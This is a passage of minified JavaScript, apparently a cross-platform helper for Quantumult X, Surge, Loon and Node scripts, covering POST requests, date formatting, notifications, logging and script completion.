if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}